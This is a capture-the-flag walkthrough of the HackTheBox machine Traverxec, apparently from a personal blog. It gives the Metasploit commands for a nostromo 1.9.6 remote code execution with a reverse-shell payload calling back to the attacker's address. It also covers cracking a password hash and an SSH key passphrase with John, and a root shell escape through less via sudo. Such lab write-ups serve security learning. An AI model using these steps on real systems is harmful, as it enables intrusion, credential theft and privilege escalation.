---
layout: article
title: HackTheBox - Traverxec
tags: HackTheBox write-up
date: 2019-01-01 08:00:00 +0100
---

![banner](/assets/images/traverxec.png)

<!--more-->

<h2>Traverxec</h2>
<h3>The Basics</h3>
The first thing we should do is map the box IP address to the box name  .htb in the `/etc/hosts` file.
`10.10.10.165   traverxec.htb`

<h3>Initial Scan</h3>
Next up we run our standard NMAP scan `nmap -sC -sV traverxec.htb`. We get results back for 2 ports: 22 SSH open, 80 HTTP open running nostromo 1.9.6.

![Initial NMAP scan](/assets/images/traverxec-initial-scan.png)

<h3>Exploiting nostromo Directory Traversal RCE</h3>
A quick *searchsploit* for **nostromo** yields 2 results, one directory traversal RCE shell script for nostromo 1.9.3 and a metasploit RCE. Upon closer inspection of the metasploit RCE with `searchsploit -x exploits/multiple/remote/47573.rb` we can see it's meant for nostromo 1.9.6. Great, let's give it a try.

![nostromo RCE](/assets/images/traverxec-nostromo-rce.png)

```
msfconsole
use exploit/multi/http/nostromo_code_exec
set RHOSTS 10.10.10.165
set RPORT 80
set LHOST 10.10.14.<your-ip-here>
set payload cmd/unix/reverse_python
exploit
```

We have our initial shell as **www-data**, we can upgrade it with `python -c "import pty;pty.spawn('/bin/bash');"; export TERM=xterm`.

![initial shell www-data](/assets/images/traverxec-initial-shell.png)

<h3>Cracking htpassd and SSH private key to gain user</h3>
If we do some manual enumeration and look around in `/var/nostromo/conf` we can find two files of interest, a `.htpasswd` and `nhttpd.conf`. The `.htpasswd` file contains a hashed password for the user **David**.
If we throw the hash into **hash-identifier or a service like [Tunnelsup hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) we can see it's a MD5 hash, more specifically MD5-Crypt.
Now that we know the hash type, we can try to crack it with JohnTheRipper. We use the `--format=crypt` switch to specify it's a MD5-Crypt hash. It will take John a little over 7 minutes to successfully crack the hash with rockyou.txt.

![john](/assets/images/traverxec-david-hash.png)

Next we'll take a look at the other interesting file `nhttpd.conf`. At the bottom of the config file we can see the **HOMEDIRS** section which defines how we can serve the home directories of users via HTTP according to the [nostromo documentation](http://www.nazgul.ch/dev/nostromo_man.html).
In essence this means we can access a users home directory like `/home/david` via our browser over HTTP by adding a `~` in the URL followed by the directory name. The `homedirs_public` options restricts access within a home directory to a single sub-directory as defined in the config file.

![nostromo config](/assets/images/traverxec-nostromo-home-dir.png)

We can try this out and browse to `http://traverxec.htb/~david/`. Unfortunately we are greeted by a "Private space. Nothing here. Keep out!". Something else we can try is use our shell to navigate directory to these directories.
`cd /home/david/public_www`.

Looking around we can see a sub-directory `/protected-file-area` which contains a backup backup of SSH related files.
If we were to navigate to `http://traverxec.htb/~david/protected-file-area/` and use the password we cracked from the `.htpasswd` file with the username **David**, we would see the same backup archive.

![protected file area](/assets/images/traverxec-david-protected-file-area.png)

Let's download the archive and extract the contents and move it to our current directory.

```
tar -xzf backup-ssh-identity-files-tgz
mv home/david/.ssh/* .
rm -rf home
```

The archive contained 3 files, `id_rsa`, `id_rsa.pub`, and `authorized_keys`. Let's get JohnTheRipper to crack the private key.

```
ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

John successfully cracks the private key, let's try SSH into the user **David**.
`ssh -i id_rsa david@traverxec.htb`

![cracked ssh private key](/assets/images/traverxec-cracked-ssh.png)

We successfully connect and can grab the user flag.

![user flag](/assets/images/traverxec-user-flag.png)

<h3>Exploiting less to gain a root shell</h3>
The first thing that grabs our attention is the `/bin` directory in `/home/david`. It contains 2 files, `server-stats.head` and `server-stats.sh`.
The `server-stats.sh` script seems to contain some form of logging functionality, the very last line is interesting because it contains a `sudo` command which is executed as **David**.

![server-stats](/assets/images/traverxec-server-stats.png)

Let's run this command manually and without the pipe into `cat`. It successfully executed but nothing interesting happens.
If we resize our terminal, so the text doesn't fit on the screen anymore, in this case the output will automatically be piped into `less`. A quick search for `less` on [GTFOBins](https://gtfobins.github.io/gtfobins/less/) will tell us we can use `!/bin/sh` to spawn a shell.
We successfully spawn a root shell.

![root shell](/assets/images/traverxec-root-shell.png)

Now let's grab the root flag.

![root flag](/assets/images/traverxec-root-flag.png)